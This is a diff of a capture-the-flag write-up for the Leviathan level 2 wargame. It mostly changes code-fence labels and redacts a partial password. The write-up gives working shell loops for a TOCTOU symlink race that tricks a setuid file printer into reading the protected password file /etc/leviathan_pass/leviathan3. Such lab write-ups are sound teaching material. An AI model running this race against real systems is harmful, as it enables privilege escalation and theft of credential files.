@@ -1,5 +1,5 @@
 We will start by listing the contents of the home directory.
-```bash
+```console
 leviathan2@gibson:~$ ll
 total 36
 drwxr-xr-x  2 root       root        4096 Oct  5  2023 ./
@@ -10,23 +10,23 @@ drwxr-xr-x 83 root       root        4096 Oct  5  2023 ../
 -rw-r--r--  1 root       root         807 Jan  6  2022 .profile
 ```
 We can see an executable named `printfile`. Lets run it and see what happens.
-```bash
+```console
 leviathan2@gibson:~$ ./printfile
 *** File Printer ***
 Usage: ./printfile filename
 ```
 We need to give a file as argument. Since we know that all the passwords for leviathan are stored in `/etc/leviathan_pass` we should find the file called `leviathan3` and give it as an argument.
-```bash
+```console
 leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
 You cant have that file...
 ```
 As it seems we cant have this file. 
 So let's just make a copy of this executable on our local machine by converting it first to base64.
-```bash
+```console
 leviathan2@gibson:~$ base64 printfile
 ```
 Then paste the base64 characters on a file with `.base64` suffix and then decode it to binary with the name you want.
-```bash
+```console
 User@Github:~$ nano printfile.base64
 User@Github:~$ base64 -d printfile.base64 > printfile
 ```
@@ -73,7 +73,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 ```
 This program prints the contents of a file specified by the user if the user has read access to it. If no file is specified, it prints usage instructions.
 Lets navigate to the `/etc/leviathan_pass` path to see who can read the file `leviathan3`.
-```bash
+```console
 leviathan2@gibson:/etc/leviathan_pass$ ll
 total 48
 drwxr-xr-x   2 root       root        4096 Oct  5  2023 ./
@@ -94,28 +94,28 @@ In a TOCTTOU attack, an attacker exploits the timing and order of events to gain
 We need 2 terminals for this to work.
 On the first terminal we will execute the `printfile` indefinetely and will filter any error messages and on the second terminal we will make a symbolic link to the real `leviathan3` in the temp directory we made, then remove it, then make a regular file named `leviathan3` and then remove the regular file.
 Lets start by creating the temp directory and giving it read write permissions.
-```bash
+```console
 leviathan2@gibson:~$ cd $(mktemp -d)
 leviathan2@gibson:/tmp/tmp.uNKevxoo8G$ chmod 755 .
 ```
 And now we run a while loop executing the `printfile`.
-```bash
+```console
 while true; do /home/leviathan2/printfile $(pwd)/leviathan3 2>&1 | egrep -v "You cant have that file...|/bin/cat: /tmp/tmp.uNKevxoo8G/leviathan3: No such file or directory" ; done
 ```
 Now to our second terminal: We navigate on the directory of the first terminal:
-```bash
+```console
 leviathan2@gibson:~$ cd /tmp/tmp.uNKevxoo8G
 ```
 And run a while loop that will make the symbolic link to the real `leviathan3` in the temp directory we made, then remove it, then make a regular file named `leviathan3` and then remove the regular file.
-```bash
+```console
 leviathan2@gibson:/tmp/tmp.uNKevxoo8G$ while true; do ln -sf /etc/leviathan_pass/leviathan3 leviathan3; rm -f leviathan3
 ; touch leviathan3; rm leviathan3; done
 ```
 And now the output of our first terminal should be:
 ```
-Q0G8j.....
-Q0G8j.....
-Q0G8j.....
-Q0G8j.....
+*password*.....
+*password*.....
+*password*.....
+*password*.....
 ```
 Thats our password for the next level!
